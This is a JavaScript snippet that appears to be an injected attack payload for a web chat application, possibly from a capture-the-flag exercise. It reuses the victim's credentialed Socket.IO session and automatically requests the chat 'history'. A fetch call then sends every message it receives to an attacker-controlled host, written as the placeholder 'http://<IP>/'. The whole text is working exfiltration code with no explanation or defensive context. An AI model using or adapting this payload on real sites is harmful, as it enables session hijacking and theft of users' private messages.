let value;
const res = axios.get(`/user/api/chat`);
const socket = io('/',{withCredentials: true});


//listening for the messages
socket.on('message', (my_message) => {

  //console.log("Received From Server: " + my_message)
  // Show_messages_on_screen_of_Server(my_message)
  //
  fetch("http://<IP>/?" + my_message );

})

// rewrite the typing_chat function to only send message 'history'
const typing_chat_new = () => {
  value = "history"; //document.getElementById('user_message').value
  if (value) {
    // sending the  messages to the server
    socket.emit('client_message', value)
    Show_messages_on_screen_of_Client(value);
    // here we will do out socket things..
    document.getElementById('user_message').value = ""
  }
  else {
    alert("Cannot send Empty Messages");
  }

}

// send message
typing_chat_new()